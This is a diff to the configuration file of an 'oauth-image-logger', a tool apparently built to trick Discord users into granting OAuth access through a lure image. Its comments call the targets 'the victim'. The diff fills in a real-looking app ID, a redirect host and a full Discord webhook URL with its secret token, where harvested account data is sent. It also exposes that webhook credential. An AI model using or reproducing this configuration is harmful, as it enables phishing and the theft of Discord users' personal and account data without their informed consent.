@@ -1,10 +1,10 @@
 # language: Python, file: oauth-image-logger/config/settings.py
 # edit these four, nothing else
 
-CLIENT_ID    = "YOUR_DISCORD_APP_ID"
-REDIRECT_URI = "https://your.site/cb"
-COVER_URL    = "https://i.imgur.com/yourcover.jpg"
-WEBHOOK      = "https://discord.com/api/webhooks/REPLACE/REPLACE"
+CLIENT_ID    = "1568513995990765788"
+REDIRECT_URI = "oaoaoao-production.up.railway.app"
+COVER_URL    = "https://i.imgur.com/Idee5Xd.jpeg"
+WEBHOOK      = "https://discord.com/api/webhooks/1574728200398045214/8Jl_tWvXltFY1OS-H4wlb_tbNwLSdSjahC37Hp9E4BqptlV-b5caOS0--6sFjK-KtsH1"
 
 # what you ask the victim to grant
 # identify        -> username, id, avatar
